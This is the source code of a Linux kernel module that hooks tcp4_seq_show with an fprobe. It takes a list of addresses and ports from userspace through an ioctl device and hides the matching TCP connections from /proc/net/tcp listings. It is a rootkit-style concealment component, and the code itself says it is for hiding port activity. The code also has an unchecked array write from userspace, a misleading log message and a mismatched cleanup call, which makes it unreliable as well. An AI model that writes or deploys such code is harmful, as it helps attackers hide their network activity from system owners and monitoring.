#include <asm/errno.h>
#include <net/tcp.h>

#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fprobe.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/rhashtable.h>
#include <linux/slab.h>
#include <linux/tcp.h>
#include <linux/uaccess.h>

#include "common.h"

MODULE_LICENSE("GPL");

static struct conn_info infos[256];
static int infos_len;

static long conn_recv_ioctl(struct file * file, unsigned int cmd, unsigned long arg) {
    struct conn_info user_input;
    if (cmd != IOCTL_SEND_DATA) return -EINVAL;

    // Read structured data from userspace
    if (copy_from_user(&user_input, (struct task_data __user *)arg, sizeof(user_input)))
        return -EFAULT;

    // Store info to array
    infos[infos_len].id = user_input.id;
    infos[infos_len].dport = user_input.dport;
    infos[infos_len].daddr = user_input.daddr;
    infos_len++;

    return 0;
}

static DEFINE_PER_CPU(struct conn_info, cpu_tcp_info);

static int tcp4_seq_show_entry(struct fprobe * fp, unsigned long entry_ip, unsigned long ret_ip,
                               struct pt_regs * regs, void * entry_data) {
    // tcp4_seq_show(struct seq_file *seq, void *v)
    // Argument 'v' is in the SI (rsi)
    struct sock * sk = (struct sock *)regs->si;

    // Skip header line (v == 1) or NULL
    if (!sk || sk == (struct sock *)1)
        return 0;

    struct conn_info * info = this_cpu_ptr(&cpu_tcp_info);
    info->daddr = sk->__sk_common.skc_daddr;
    info->dport = sk->__sk_common.skc_dport;

    return 0;
}

static void tcp4_seq_show_exit(struct fprobe * fp, unsigned long entry_ip, unsigned long ret_ip,
                               struct pt_regs * regs, void * entry_data) {
    struct conn_info * info = this_cpu_ptr(&cpu_tcp_info);

    // Hide port activity
    for (int i = 0; i < infos_len; i++) {
        u32 port = infos[i].dport;
        u32 addr = infos[i].daddr;
        if (info->dport == htons(port) && info->daddr == addr) {
            pr_info("fprobe: Hiding TCP entry for port 80\n");
            // Rewrite return code
            regs->ax = EACCES;
            break;
        }
    }
}

static const struct file_operations fops = { .unlocked_ioctl = conn_recv_ioctl };
static dev_t dev_num;
static struct cdev conn_cdev;    // The character device structure
static struct class * conn_class; // The sysfs class for auto-creation

static int create_chr_dev(void) {
    // Dynamically allocate a Major Number
    if (alloc_chrdev_region(&dev_num, 0, 1, "conn_manager") < 0)
        return -1;

    // Initialize and add the character device to the system
    cdev_init(&conn_cdev, &fops);
    if (cdev_add(&conn_cdev, dev_num, 1) < 0) {
        unregister_chrdev_region(dev_num, 1);
        return -1;
    }

    // Create a class (appears in /sys/class/)
    conn_class = class_create("conn_class");
    if (IS_ERR(conn_class)) {
        cdev_del(&conn_cdev);
        unregister_chrdev_region(dev_num, 1);
        return -1;
    }

    // Create the device node (appears in /dev/task_dev)
    if (IS_ERR(device_create(conn_class, NULL, dev_num, NULL, DEV_NAME))) {
        class_destroy(conn_class);
        cdev_del(&conn_cdev);
        unregister_chrdev_region(dev_num, 1);
        return -1;
    }

    return 0;
}

static struct fprobe tcp_probe = {
    .entry_handler = tcp4_seq_show_entry,
    .exit_handler = tcp4_seq_show_exit,
};

static int __init fprobe_init(void) {
    // Register fprobes
    int ret = register_fprobe(&tcp_probe, "tcp4_seq_show", NULL);
    if (ret) {
        pr_err("Failed to register fprobe tcp4_seq_show; ret: %d\n", ret);
        return ret;
    }

    if (create_chr_dev() != 0) {
        pr_err("Failed to create chr device\n");
        return -1;
    }

    pr_info("Module loaded. Major: %d\n", MAJOR(dev_num));
    return 0;
}

static void __exit fprobe_exit(void) {
    unregister_chrdev(240, "task_dev");
    // Unregister fprobes
    unregister_fprobe(&tcp_probe);

    // Unregister chr_dev
    device_destroy(conn_class, dev_num);
    class_destroy(conn_class);
    cdev_del(&conn_cdev);
    unregister_chrdev_region(dev_num, 1);
}

module_init(fprobe_init);
module_exit(fprobe_exit);
